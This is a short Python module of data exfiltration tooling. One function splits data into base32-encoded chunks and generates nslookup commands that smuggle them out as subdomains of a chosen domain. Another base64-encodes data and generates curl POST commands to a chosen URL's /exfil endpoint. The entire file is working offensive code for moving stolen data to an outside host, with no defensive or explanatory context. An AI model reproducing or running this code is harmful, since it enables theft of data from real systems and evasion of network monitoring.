"""Data exfiltration techniques: DNS, HTTP."""
import base64

def dns_exfil(data, domain):
    """Generate DNS exfiltration commands."""
    chunks = [data[i:i+30] for i in range(0, len(data), 30)]
    cmds = []
    for i, chunk in enumerate(chunks):
        encoded = base64.b32encode(chunk.encode()).decode().rstrip("=").lower()
        cmds.append("nslookup {}{}.{}".format(encoded, i, domain))
    return cmds

def http_exfil(data, url):
    """Generate HTTP exfiltration curl commands."""
    encoded = base64.b64encode(data.encode()).decode()
    chunks = [encoded[i:i+1000] for i in range(0, len(encoded), 1000)]
    cmds = []
    for i, chunk in enumerate(chunks):
        cmds.append("curl -s -X POST -d 'd={}' {}/exfil".format(chunk, url))
    return cmds
